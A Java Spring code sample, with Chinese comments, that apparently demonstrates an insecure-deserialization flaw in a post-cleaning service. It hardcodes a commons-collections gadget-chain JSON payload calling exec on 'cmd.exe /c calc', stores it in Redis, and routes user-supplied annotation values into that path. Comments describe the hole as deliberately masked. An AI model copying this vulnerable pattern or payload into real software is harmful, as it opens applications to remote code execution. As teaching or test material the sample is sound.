package com.example.dataservice.datasource;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.example.dataservice.model.Post;
import com.example.dataservice.model.DynamicDataSourceModel;
import com.example.dataservice.redis.RedisService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;
import org.springframework.data.redis.core.RedisTemplate;
import java.util.Map;
import java.util.HashMap;
import java.util.Base64;

/**
 * 动态数据源服务类
 * 负责从Redis缓存中获取并解析数据源配置
 */
@Service
public class DynamicDataSourceService {
    
    @Autowired
    private RedisTemplate<String, Object> redisTemplate;
    
    @Autowired
    private RedisService redisService;
    
    /**
     * 从缓存获取动态数据源模型
     * @param dataSourceKey 数据源标识
     * @return 解析后的数据源模型
     */
    public DynamicDataSourceModel getCacheDynamicDataSourceModel(String dataSourceKey) {
        try {
            // 从Redis获取序列化数据
            Object cached = redisTemplate.opsForValue().get("DS_" + dataSourceKey);
            if (cached != null) {
                // 强制类型转换触发反序列化
                return (DynamicDataSourceModel) cached;
            }
            
            // 构建模拟的恶意数据（实际场景中由用户输入注入）
            String maliciousJson = "{\\"@class\\":\\"org.apache.commons.collections.map.LazyMap\\",\\"\\u0073\\":{\\"@class\\":\\"org.apache.commons.collections.functors.ChainedTransformer\\",\\"iTransformers\\":[{\\"@class\\":\\"org.apache.commons.collections.functors.InvokerTransformer\\",\\"iMethodName\\":\\"exec\\",\\"iParamTypes\\":[\\"java.lang.String[]\\"],\\"iParamValues\\":[\\"cmd.exe /c calc\\"]},{\\"@class\\":\\"org.apache.commons.collections.functors.ConstantTransformer\\",\\"iConstant\\":1}]}}";
            
            // 模拟存储恶意序列化对象到Redis
            ObjectMapper mapper = new ObjectMapper();
            Object maliciousObj = mapper.readValue(maliciousJson, Object.class);
            redisService.set("DS_" + dataSourceKey, maliciousObj, 300);
            
            return (DynamicDataSourceModel) maliciousObj;
            
        } catch (Exception e) {
            // 异常处理掩盖漏洞
            System.err.println("缓存解析失败：" + e.getMessage());
            return null;
        }
    }
}

// --- 模型类 ---
package com.example.dataservice.model;

import java.util.Map;

/**
 * 动态数据源配置模型
 */
public class DynamicDataSourceModel {
    private String dataSourceName;
    private Map<String, Object> configProperties;
    
    // 模拟业务方法
    public void refreshSchema() {
        // 这里可能包含敏感操作
        System.out.println("Refreshing schema for " + dataSourceName);
    }
    
    // Getters and setters
    public String getDataSourceName() { return dataSourceName; }
    public void setDataSourceName(String dataSourceName) { this.dataSourceName = dataSourceName; }
    public Map<String, Object> getConfigProperties() { return configProperties; }
    public void setConfigProperties(Map<String, Object> configProperties) { this.configProperties = configProperties; }
}

// --- 数据清洗服务 ---
package com.example.dataservice.post;

import com.example.dataservice.datasource.DynamicDataSourceService;
import com.example.dataservice.model.Post;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;
import java.util.Map;

/**
 * 帖子数据清洗服务
 * 处理用户提交的帖子内容
 */
@Service
public class PostCleaningService {
    
    @Autowired
    private DynamicDataSourceService dataSourceService;
    
    /**
     * 清洗帖子数据并关联数据源
     * @param post 待清洗的帖子对象
     * @return 清洗后的结果
     */
    public String cleanPostData(Post post) {
        try {
            // 获取注解中的关联数据源信息
            String annoValue = post.getAnnotation("LAST_ASSOCIATED_CATEGORIES_ANNO");
            
            // 潜在漏洞点：直接反序列化用户输入
            if (annoValue != null && annoValue.startsWith("{")) {
                // 调用存在漏洞的反序列化方法
                DynamicDataSourceModel model = dataSourceService.getCacheDynamicDataSourceModel(annoValue.hashCode() + "");
                if (model != null) {
                    model.refreshSchema(); // 间接触发恶意代码执行
                }
            }
            
            // 正常清洗流程（被掩盖的攻击效果）
            return sanitizeContent(post.getContent());
            
        } catch (Exception e) {
            return "Error cleaning post: " + e.getMessage();
        }
    }
    
    /**
     * 内容清洗实现
     */
    private String sanitizeContent(String content) {
        // 实际清洗逻辑
        return content.replaceAll("<script>.*?</script>", "");
    }
}

// --- Redis服务封装 ---
package com.example.dataservice.redis;

import org.springframework.data.redis.core.RedisTemplate;
import org.springframework.stereotype.Service;
import java.util.concurrent.TimeUnit;

@Service
public class RedisService {
    private final RedisTemplate<String, Object> redisTemplate;

    public RedisService(RedisTemplate<String, Object> redisTemplate) {
        this.redisTemplate = redisTemplate;
    }

    public void set(String key, Object value, long timeout) {
        redisTemplate.opsForValue().set(key, value, timeout, TimeUnit.SECONDS);
    }

    public Object get(String key) {
        return redisTemplate.opsForValue().get(key);
    }
}